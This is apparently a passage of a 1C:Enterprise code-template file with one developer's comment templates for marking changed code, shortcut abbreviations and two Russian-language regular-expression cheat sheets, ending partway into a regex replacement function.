{0,
{"Комментарий Добавлен (в блоки +++)",0,0,"/комД","//{+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Добавлен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//}+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Добавлен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Комментарий Изменен (в блоки ***) (изменнённый код комментируется двумя //, т.е. ////)",0,0,"/ком*","//{*** АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//}*** АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Комментарий Изменен (в блоки ***) (изменнённый код комментируется двумя //, т.е. ////)",0,0,"/комИ","//{*** АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//}*** АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Комментарий Удалён (в блоки ---)",0,0,"/ком-","//{--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Удален код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//}--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Удален код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Комментарий Удалён (в блоки ---)",0,0,"/комУ","//{--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Удален код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//}--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Удален код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Замена кода",0,0,"/зам*Х","//{*** АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
//{--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Удален код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">

//}--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Удален код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">

//}*** АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
}
}
},
{0,
{"Область кода",0,0,"обл[асть]","#Область <?""Название области"">
<?>
#КонецОбласти // <?""Название области"">"}
},
{0,
{"Подменю",0,0,"подм[еню]","//====== <?""Название""> ===================================================================

<?>

//====== <?""Название""> ==================================================================="}
},
{0,
{"Подменю, начало и конец, название",0,0,"подм[еню]","//+++ ====== <?""Название""> ================================================

<?>

//--- ====== <?""Название""> ================================================"}
},
{0,
{"Подменю, начало и конец, название, автор",0,0,"подм[еню]","//+++ ====== <?""Название""> [ АйТи КучеровРМ ] ================================================

<?>

//--- ====== <?""Название""> [ АйТи КучеровРМ ] ================================================

"}
},
{0,
{"Подменю, начало и конец, название, автор, дата, ТЗ",0,0,"подм[еню]","//+++ ====== <?""Название""> [ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> ТЗ # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)""> ] ================================================

<?>

//--- ====== <?""Название""> [ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> ТЗ # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)""> ] ================================================

"}
},
{0,
{"Комментарий ВНИМАНИЕ (!!!)",0,0,"/!","//!{ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//!} АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Комментарий ВНИМАНИЕ (!!!) со стеком вызовов",0,0,"/!СВ","//!{ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
//Вызываясь стеком вызовов:
<?>
//!} АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Комментарий",0,0,"/ком","//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">
<?>
//--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">"}
},
{0,
{"Комментарий-область",0,0,"/комО[бласт]","#Область АйТи_КучеровРМ_<?"""", ДатаВремя, ""ДФ=yyyyMMdd"">
<?>
#КонецОбласти //АйТи_КучеровРМ_<?"""", ДатаВремя, ""ДФ=yyyyMMdd"">"}
},
{0,
{"Комментарий-область с пояснением",0,0,"/комО[бласт]","#Область АйТи_КучеровРМ_<?"""", ДатаВремя, ""ДФ=yyyyMMdd"">_<?""Слитно номер ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
#КонецОбласти //АйТи_КучеровРМ_<?"""", ДатаВремя, ""ДФ=yyyyMMdd"">_<?""Слитно номер ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)""> "}
},
{0,
{"Комментарий с пояснением (пояснение условно называется в этих шаблонах как ""Комментарий"")",0,0,"/комК","//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номер ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номер ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Комментарий с пояснением и с ссылкой (лучше создавать такой коммент программно)",0,0,"","//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номер ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)""> >> <?""Ссылка на документ с заданием"">
<?>
//--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номер ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)""> >> <?""Ссылка на документ с заданием"">"}
},
{0,
{"Комментарий с заменой предыдущего кода",0,0,"/комЗамБыл[о]","//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номер ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
//Причина заменты кода: <?>
//+++Было до <?"""", ДатаВремя, """">
// Далее тут старый код, который теперь заменён
//---Было до <?"""", ДатаВремя, """">
<?>
//--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номер ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Комментарий с заменой в 1 строку (идея хорошая, но служебный текст добавляет в итогоый текст, поэтому ниже вариант с курсором...)",0,0,"","//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Было: <?""Строка для замены (т.е. старый код)"">
<?""Строка для замены (т.е. старый код)""> //--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">"}
},
{0,
{"Комментарий с заменой в 1 строку",0,0,"/комЗ[ам]","//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Было: <?""Строка для замены (т.е. старый код)"">
<?> //--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">"}
},
{0,
{"Комментарий с пояснением",0,0,"/комП[ояснение]","//+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> <?""Символы пояснения"", ВыборВарианта, ""//"", ""//"", "">>"", "">>"", ""[["", ""[["", ""**"", ""**"", ""#"", ""#""> <?""Текст пояснения"">
<?>
//--- АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> <?""Символы пояснения"", ВыборВарианта, ""//"", ""//"", "">>"", "">>"", ""[["", ""[["", ""**"", ""**"", ""#"", ""#""> <?""Текст пояснения"">"}
},
{0,
{"Было до_право",0,0,"былоП","// [ АйТи КучеровРМ ] Справа было до <?"""", ДатаВремя, """">: <?""Какое было предыдущее состояние"">"}
},
{0,
{"Было до_право (командой /БП (т.е. было справо))",0,0,"/БП","// [ АйТи КучеровРМ ] Справа было до <?"""", ДатаВремя, """">: <?""Какое было предыдущее состояние"">"}
},
{0,
{"Было до_лево",0,0,"былоЛ","// [ АйТи КучеровРМ ] Слево было до <?"""", ДатаВремя, """">: <?""Какое было предыдущее состояние"">"}
},
{0,
{"Было до_лево  (командой /БП (т.е. было слево))",0,0,"/БЛ","// [ АйТи КучеровРМ ] Слево было до <?"""", ДатаВремя, """">: <?""Какое было предыдущее состояние"">"}
},
{0,
{"Новое условие в Если",0,1,"","Если Истина Тогда // [ АйТи КучеровРМ ] было до <?"""", ДатаВремя, """">: <?""Какое было предыдущее состояние""> "}
},
{0,
{"Техническое задание",0,0,"/ТЗ","// ТЗ № <?""№"">"}
},
{0,
{"Замена кода",0,0,"/зам[ена]","// Причина заменты кода: 
//+++ Было до <?"""", ДатаВремя, """"> // Далее тут старый код, который теперь заменён
<?>
//--- Было до <?"""", ДатаВремя, """">"}
},
{0,
{"Бекап",0,0,"бек[ап]","1Cv8_КучеровРМ_<?"""", ДатаВремя, ""ДФ='yyyy-MM-dd_HH-mm'""><?"""", ВыборВарианта, ""Без расширения"", """", "".cf"", "".cf"", "".dt"", "".dt"">"}
},
{3,
{"Описание изменений (комментарий ~~~)",1,0,"",""},
{0,
{"Описание изменений",0,0,"ОблИзм[енен]","#Область ОписаниеИзменений
<?>
#КонецОбласти"}
},
{0,
{"Описание изменений с комментарием",0,0,"ОблИзмК[оммент]","#Область ОписаниеИзменений
//~~~ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменения 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
#КонецОбласти"}
},
{0,
{"Комментарий изменений",0,0,"/ё","//~~~ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменения 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
}
},
{3,
{"Комментарии других языков (XML, HTML)",1,0,"",""},
{0,
{"Комментарий в XML, HTML",0,0,"","<!-- + АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)""> -->
<?>
<!-- - АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)""> -->"}
},
{0,
{"Комментарий в XML, HTML (через {})",0,0,"","<!--{ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)""> -->
<?>
<!--} АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)""> -->"}
},
{0,
{"Комментарий в JSON (хотя они тут не предусмотрены)",0,0,"","{
   ""_comment"": ""АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"",
}"}
}
}
},
{11,
{"Транслит",1,0,"",""},
{0,
{"БЮ в <>",0,0,"БЮ","<>"}
},
{0,
{"ХЪ в []",0,0,"ХЪ","[<?>]"}
},
{0,
{"ТГДД в NULL",0,0,"ТГДД","NULL<?>"}
},
{0,
{"ЭЭ в ''",0,0,"ЭЭ","'<?>'"}
},
{0,
{"ЮЮ",0,0,"ЮЮ","// >> <?>"}
},
{0,
{"Ю= в >=",0,0,"ю=",">=<?>"}
},
{0,
{"Б= в <=",0,0,"б=","<="}
},
{0,
{"ХМЛ",0,0,"ХМЛ","XML<?>"}
},
{0,
{"ХМЛС в XMLСтрока (преобразует элемент 1С в текстовый вид)",0,0,"ХМЛС[тр]","XMLСтрока(<?>)"}
},
{0,
{"ХМЛЗ в XMLЗначение (преобразует текстовый вид в элемент 1С, нужно указать Тип)",0,0,"ХМЛЗ[нач]","XMLЗначение(Тип(""СправочникСсылка.Контрагенты""), ""<?>"");"}
},
{0,
{"ЖСОН",0,0,"ЖСОН","Json<?>"}
}
},
{9,
{"Регулярные выражения (COMОбъект(""VBScript.RegExp""))",1,0,"",""},
{2,
{"Шпаргалка",1,0,"",""},
{0,
{"Шпаргалка 1",0,0,"","Шпаргалка по регулярным выражениям
Квантификаторы
 	Аналог	Пример	Описание
?	{0,1}	a?	одно или ноль вхождений «а»
+	{1,}	a+	одно или более вхождений «а»
*	{0,}	a*	ноль или более вхождений «а»
Модификаторы
Символ «минус» (-) меред модификатором (за исключением U) создаёт его отрицание.

 	Описание
g	глобальный поиск (обрабатываются все совпадения с шаблоном поиска)
i	игнорировать регистр
m	многострочный поиск. Поясню: по умолчанию текст это одна строка, с модификатором есть отдельные строки, а значит ^- начало строки в тексте, $- конец строки в тексте.
s	текст воспринимается как одна строка, спец символ «точка» (.) будет вкючать и перевод строки
u	используется кодировка UTF-8
U	инвертировать жадность
x	игнорировать все неэкранированные пробельные и перечисленные в классе символы
Спецсимволы
 	Аналог	Описание
()	 	подмаска, вложенное выражение
[]	 	групповой символ
{a,b}	 	количество вхождений от «a» до «b»
|	 	логическое «или», в случае с односимвольными альтернативами используйте []
\	 	экранирование спец символа
.	 	любой сивол, кроме перевода строки
\d	[0-9]	десятичная цифра
\D	[^\d]	любой символ, кроме десятичной цифры
\f	 	конец (разрыв) страницы
\n	 	перевод строки
\pL	 	буква в кодировке UTF-8 при использовании модификатора u
\r	 	возврат каретки
\s	[ \t\v\r\n\f]	пробельный символ
\S	[^\s]	любой символ, кроме промельного
\t	 	табуляция
\w	[0-9a-z_]	любая цифра, буква или знак подчеркивания
\W	[^\w]	любой символ, кроме цифры, буквы или знака подчеркивания
\v	 	вертикальная табуляция
Спецсимволы внутри символьного класса
 	Пример	Описание
^	[^da]	отрицание, любой символ кроме «d» или «a»
-	[a-z]	интервал, любой симво от «a» до «z»
Позиция внутри строки
 	Пример	Соответствие	Описание
^	^a	aaa aaa	начало строки
$	a$	aaa aaa	конец строки
\A	\Aa	aaa aaa
aaa aaa	начало текста
\z	a\z	aaa aaa
aaa aaa	конец текста
\b	a\b
\ba	aaa aaa
aaa aaa	граница слова, утверждение: предыдущий символ словесный, а следующий - нет, либо наоборот
\B	\Ba\B	aaa aaa	отсутствие границы слова
\G	\Ga	aaa aaa	Предыдущий успешный поиск, поиск остановился на 4-й позиции — там, где не нашлось a
Скачать в PDF, PNG.
Якоря
Якоря в регулярных выражениях указывают на начало или конец чего-либо. Например, строки или слова. Они представлены определенными символами. К примеру, шаблон, соответствующий строке, начинающейся с цифры, должен иметь следующий вид:

^[0-9]+
Здесь символ ^обозначает начало строки. Без него шаблон соответствовал бы любой строке, содержащей цифру.

Символьные классы
Символьные классы в регулярных выражениях соответствуют сразу некоторому набору символов. Например, \dсоответствует любой цифре от 0 до 9 включительно, \wсоответствует буквам и цифрам, а \W— всем символам, кроме букв и цифр. Шаблон, идентифицирующий буквы, цифры и пробел, выглядит так:

\w\s
POSIX
POSIX — это относительно новое дополнение семейства регулярных выражений. Идея, как и в случае с символьными классами, заключается в использовании сокращений, представляющих некоторую группу символов.

Утверждения
Поначалу практически у всех возникают трудности с пониманием утверждений, однако познакомившись с ними ближе, вы будете использовать их довольно часто. Утверждения предоставляют способ сказать: «я хочу найти в этом документе каждое слово, включающее букву “q”, за которой не следует “werty”».

[^\s]*q(?!werty)[^\s]*
Приведенный выше код начинается с поиска любых символов, кроме пробела ([^\s]*), за которыми следует q. Затем парсер достигает «смотрящего вперед» утверждения. Это автоматически делает предшествующий элемент (символ, группу или символьный класс) условным — он будет соответствовать шаблону, только если утверждение верно. В нашем случае, утверждение является отрицательным (?!), т. е. оно будет верным, если то, что в нем ищется, не будет найдено.

Итак, парсер проверяет несколько следующих символов по предложенному шаблону (werty). Если они найдены, то утверждение ложно, а значит символ qбудет «проигнорирован», т. е. не будет соответствовать шаблону. Если же wertyне найдено, то утверждение верно, и с qвсе в порядке. Затем продолжается поиск любых символов, кроме пробела ([^\s]*).

Кванторы
Кванторы позволяют определить часть шаблона, которая должна повторяться несколько раз подряд. Например, если вы хотите выяснить, содержит ли документ строку из от 10 до 20 (включительно) букв «a», то можно использовать этот шаблон:

a{10,20}
По умолчанию кванторы — «жадные». Поэтому квантор +, означающий «один или больше раз», будет соответствовать максимально возможному значению. Иногда это вызывает проблемы, и тогда вы можете сказать квантору перестать быть жадным (стать «ленивым»), используя специальный модификатор. Посмотрите на этот код:

"".*""
Этот шаблон соответствует тексту, заключенному в двойные кавычки. Однако, ваша исходная строка может быть вроде этой:

<a href=""helloworld.htm"" title=""Привет, Мир"">Привет, Мир</a>
Приведенный выше шаблон найдет в этой строке вот такую подстроку:

""helloworld.htm"" title=""Привет, Мир""
Он оказался слишком жадным, захватив наибольший кусок текста, который смог.

"".*?""
Этот шаблон также соответствует любым символам, заключенным в двойные кавычки. Но ленивая версия (обратите внимание на модификатор ?) ищет наименьшее из возможных вхождений, и поэтому найдет каждую подстроку в двойных кавычках по отдельности:

""helloworld.htm"" ""Привет, Мир""
Экранирование в регулярных выражениях
Регулярные выражения используют некоторые символы для обозначения различных частей шаблона. Однако, возникает проблема, если вам нужно найти один из таких символов в строке, как обычный символ. Точка, к примеру, в регулярном выражении обозначает «любой символ, кроме переноса строки». Если вам нужно найти точку в строке, вы не можете просто использовать «.» в качестве шаблона — это приведет к нахождению практически всего. Итак, вам необходимо сообщить парсеру, что эта точка должна считаться обычной точкой, а не «любым символом». Это делается с помощью знака экранирования.

Знак экранирования, предшествующий символу вроде точки, заставляет парсер игнорировать его функцию и считать обычным символом. Есть несколько символов, требующих такого экранирования в большинстве шаблонов и языков. Вы можете найти их в правом нижнем углу шпаргалки («Мета-символы»).

Шаблон для нахождения точки таков:

\.
Другие специальные символы в регулярных выражениях соответствуют необычным элементам в тексте. Переносы строки и табуляции, к примеру, могут быть набраны с клавиатуры, но вероятно собьют с толку языки программирования. Знак экранирования используется здесь для того, чтобы сообщить парсеру о необходимости считать следующий символ специальным, а не обычной буквой или цифрой.

Спецсимволы экранирования в регулярных выражениях
Выражение	Соответствие
\	не соответствует ничему, только экранирует следующий за ним символ. Это нужно, если вы хотите ввести метасимволы !$()*+.<>?[\]^{|}в качестве их буквальных значений.
\Q	не соответствует ничему, только экранирует все символы вплоть до \E
\E	не соответствует ничему, только прекращает экранирование, начатое \Q
Подстановка строк
Подстановка строк подробно описана в следующем параграфе «Группы и диапазоны», однако здесь следует упомянуть о существовании «пассивных» групп. Это группы, игнорируемые при подстановке, что очень полезно, если вы хотите использовать в шаблоне условие «или», но не хотите, чтобы эта группа принимала участие в подстановке.

Группы и диапазоны
Группы и диапазоны очень-очень полезны. Вероятно, проще будет начать с диапазонов. Они позволяют указать набор подходящих символов. Например, чтобы проверить, содержит ли строка шестнадцатеричные цифры (от 0 до 9 и от A до F), следует использовать такой диапазон:

[A-Fa-f0-9]
Чтобы проверить обратное, используйте отрицательный диапазон, который в нашем случае подходит под любой символ, кроме цифр от 0 до 9 и букв от A до F:

[^A-Fa-f0-9]
Группы наиболее часто применяются, когда в шаблоне необходимо условие «или»; когда нужно сослаться на часть шаблона из другой его части; а также при подстановке строк.

Использовать «или» очень просто: следующий шаблон ищет «ab» или «bc»:

(ab|bc)
Если в регулярном выражении необходимо сослаться на какую-то из предшествующих групп, следует использовать \n, где вместо nподставить номер нужной группы. Вам может понадобиться шаблон, соответствующий буквам «aaa» или «bbb», за которыми следует число, а затем те же три буквы. Такой шаблон реализуется с помощью групп:

(aaa|bbb)[0-9]+\1
Первая часть шаблона ищет «aaa» или «bbb», объединяя найденные буквы в группу. За этим следует поиск одной или более цифр ([0-9]+), и наконец \1. Последняя часть шаблона ссылается на первую группу и ищет то же самое. Она ищет совпадение с текстом, уже найденным первой частью шаблона, а не соответствующее ему. Таким образом, «aaa123bbb» не будет удовлетворять вышеприведенному шаблону, так как \1будет искать «aaa» после числа.

Одним из наиболее полезных инструментов в регулярных выражениях является подстановка строк. При замене текста можно сослаться на найденную группу, используя $n. Скажем, вы хотите выделить в тексте все слова «wish» жирным начертанием. Для этого вам следует использовать функцию замены по регулярному выражению, которая может выглядеть так:

replace(pattern, replacement, subject)
Первым параметром будет примерно такой шаблон (возможно вам понадобятся несколько дополнительных символов для этой конкретной функции):

([^A-Za-z0-9])(wish)([^A-Za-z0-9])
Он найдет любые вхождения слова «wish» вместе с предыдущим и следующим символами, если только это не буквы или цифры. Тогда ваша подстановка может быть такой:

$1<b>$2</b>$3
Ею будет заменена вся найденная по шаблону строка. Мы начинаем замену с первого найденного символа (который не буква и не цифра), отмечая его $1. Без этого мы бы просто удалили этот символ из текста. То же касается конца подстановки ($3). В середину мы добавили HTML тег для жирного начертания (разумеется, вместо него вы можете использовать CSS или <strong>), выделив им вторую группу, найденную по шаблону ($2).

Модификаторы шаблонов
Модификаторы шаблонов используются в нескольких языках, в частности, в Perl. Они позволяют изменить работу парсера. Например, модификатор iзаставляет парсер игнорировать регистры.

Регулярные выражения в Perl обрамляются одним и тем же символом в начале и в конце. Это может быть любой символ (чаще используется «/»), и выглядит все таким образом:

/pattern/
Модификаторы добавляются в конец этой строки, вот так:

/pattern/i
Мета-символы
Наконец, последняя часть таблицы содержит мета-символы. Это символы, имеющие специальное значение в регулярных выражениях. Так что если вы хотите использовать один из них как обычный символ, то его необходимо экранировать. Для проверки наличия скобки в тексте, используется такой шаблон:

\(
Шпаргалка представляет собой общее руководство по шаблонам регулярных выражений без учета специфики какого-либо языка. Она представлена в виде таблицы, помещающейся на одном печатном листе формата A4. Создана под лицензией Creative Commons на базе шпаргалки, автором которой является Dave Child. Скачать в PDF, PNG."}
},
{0,
{"Шпаргалка 2 (кратко)",0,0,"","Основы
Якоря — ^ и $
^Привет        соответствует строке, начинающейся с Привет -> тест
пока$          соответствует строке, заканчивающейся на пока
^Привет пока$  точное совпадение (начинается и заканчивается как Привет пока)
воробушки      соответствует любой строке, в которой есть текст воробушки
Квантификаторы — * + ? и {}
abc*       соответствует строке, в которой после ab следует 0 или более символов c -> тест
abc+       соответствует строке, в которой после ab следует один или более символов c
abc?       соответствует строке, в которой после ab следует 0 или один символ c
abc{2}     соответствует строке, в которой после ab следует 2 символа c
abc{2,}    соответствует строке, в которой после ab следует 2 или более символов c
abc{2,5}   соответствует строке, в которой после ab следует от 2 до 5 символов c
a(bc)*     соответствует строке, в которой после ab следует 0 или более последовательностей символов bc
a(bc){2,5} соответствует строке, в которой после ab следует от 2 до 5 последовательностей символов bc
Оператор ИЛИ — | или []
a(b|c) соответствует строке, в которой после a следует b или c -> тест
a[bc]  как и в предыдущем примере
Символьные классы — \d \w \s и .
\d соответствует одному символу, который является цифрой -> тест
\w соответствует слову (может состоять из букв, цифр и подчёркивания) -> тест
\s соответствует символу пробела (включая табуляцию и прерывание строки)
. соответствует любому символу -> тест
Используйте оператор . с осторожностью, так как зачастую класс или отрицаемый класс символов (который мы рассмотрим далее) быстрее и точнее.
У операторов \d, \w и \s также есть отрицания ― \D, \W и \S соответственно.
Например, оператор \D будет искать соответствия противоположенные \d.
\D соответствует одному символу, который не является цифрой -> тест
Некоторые символы, например ^.[$()|*+?{\ , необходимо выделять обратным слешем \ .
\$\d соответствует строке, в которой после символа $ следует одна цифра -> тест
Непечатаемые символы также можно искать, например табуляцию \t, новую строку \n, возврат каретки \r.
Флаги
Мы научились строить регулярные выражения, но забыли о фундаментальной концепции ― флагах.
Регулярное выражение, как правило, записывается в такой форме /abc/, где шаблон для сопоставления выделен двумя слешами /. В конце выражения, мы определяем значение флага (эти значения можно комбинировать):
g (global) ― не возвращает результат после первого совпадения, а продолжает поиск с конца предыдущего совпадения.
m (multi line) ― с таким флагом, операторы ^ и $ вызовут совпадение в начале и конце строки ввода (line), вместо строки целиком (string).
i (insensitive) ― делает выражение регистронезависимым (например, /aBc/i соответствует AbC).
Средний уровень
Скобочные группы ― ()
a(bc)       создаём группу со значением bc -> тест
a(?:bc)*    оперетор ?: отключает группу -> тест
a(?<foo>bc) так, мы можем присвоить имя группе -> тест
Этот оператор очень полезен, когда нужно извлечь информацию из строк или данных, используя ваш любимый язык программирования. Любые множественные совпадения, по нескольким группам, будут представлены в виде классического массива: доступ к их значениям можно получить с помощью индекса из результатов сопоставления.
Если присвоить группам имена (используя (?<foo>...)), то можно получить их значения, используя результат сопоставления, как словарь, где ключами будут имена каждой группы.
Скобочные выражения ― []
[abc]       соответствует строке, которая содержит либо символ a или a b или a c -> такой же эффект от a|b|c -> тест
[a-c]       то же, что и выше
[a-fA-F0–9] строка, представляющая одну шестнадцатеричную цифру без учёта регистра -> тест
[0–9]%      строка, содержащая символ от 0 до 9 перед знаком %
[^a-zA-Z]   строка, которая не имеет буквы от a до z или от A до Z. В этом случае ^ используется как отрицание в выражении -> тест
Помните, что внутри скобочных выражений все специальные символы (включая обратную косую черту \) теряют своё служебное значение, поэтому нам ненужно их экранировать.
Жадные и ленивые сопоставления
Квантификаторы ( * + {}) ― это «жадные» операторы, потому что они продолжают поиск соответствий, как можно глубже ― через весь текст.
Например, выражение <.+> соответствует <div>simple div</div> в This is a <div> simple div</div> test. Чтобы найти только тэг div ― можно использовать оператор ?, сделав выражение «ленивым»:
<.+?> соответствует любому символу, один или несколько раз найденному между < и >, расширяется по мере необходимости -> тест
Обратите внимание, что хорошей практикой считается не использовать оператор . , в пользу более строгого выражения:
<[^<>]+> соответствует любому символу, кроме < или >, один или более раз встречающемуся между < и > -> тест
Продвинутый уровень
Границы слов ― \b и \B
\babc\b выполняет поиск слова целиком -> тест
\b ― соответствует границе слова, наподобие якоря (он похож на $ и ^), где предыдущий символ ― словесный (например, \w), а следующий ― нет, либо наоборот, (например, это может быть начало строки или пробел).
\B ― соответствует несловообразующей границе. Соответствие не должно обнаруживаться на границе \b .
\Babc\B соответствует, только если шаблон полностью окружён словами -> тест
Обратные ссылки — \1
([abc])\1 \1          соответствует тексту из первой захватываемой группы -> тест
([abc])([de])\2\1     можно использовать \2 (\3, \4, и т.д.) для определения порядкового номера захватываемой группы -> тест
(?<foo>[abc])\k<foo>  мы присвоили имя foo группе, и теперь ссылаемся на неё используя ― (\k<foo>). Результат, как и в первом выражении -> тест
Опережающие и ретроспективные проверки — (?=) and (?<=)
d(?=r) соответствует d, только если после этого следует r, но r не будет входить в соответствие выражения -> тест
(?<=r)d соответствует d, только если перед этим есть r, но r не будет входить в соответствие выражения -> тест
Вы можете использовать оператор отрицания !
d(?!r) соответствует d, только если после этого нет r, но r не будет входить в соответствие выражения -> тест
(?<!r)d соответствует d, только если перед этим нет r, но r не будет входить в соответствие выражения -> тест
Заключение
Как вы могли убедиться, области применения регулярных выражений разнообразны. Я уверен, что вы сталкивались с похожими задачами в своей работе (хотя бы с одной из них), например такими:
Валидация данных (например, правильно ли заполнена строка time)
Сбор данных (особенно веб-скрапинг, поиск страниц, содержащих определённый набор слов в определённом порядке)
Обработка данных (преобразование сырых данных в нужный формат)
Парсинг (например, достать все GET параметры из URL или текст внутри скобок)
Замена строк (даже во время написания кода в IDE, можно, например преобразовать Java или C# класс в соответствующий JSON объект, заменить “;” на “,”, изменить размер букв, избегать объявление типа и т.д.)
Подсветка синтаксиса, переименование файла, анализ пакетов и многие другие задачи, где нужно работать со строками (где данные не должны быть текстовыми).
Перевод статьи Jonny Fox: Regex tutorial — A quick cheatsheet by examples"}
}
},
{0,
{"ЗаменитьСимволыПоШаблону",0,0,"","&НаСервереБезКонтекста
Функция ЗаменитьСимволыПоШаблону(пСтрока, пШаблонЗамены, пЗаменитьНа = """", пRegExp = Неопределено, пИгнорироватьРегистр = Истина, пПоискВсехВхожденийШаблона = Истина, пМногострочныйРежим = Истина)
	
	Если ПустаяСтрока(пСтрока) ИЛИ ПустаяСтрока(пШаблонЗамены) Тогда
		Возврат пСтрока; 
	КонецЕсли;
	
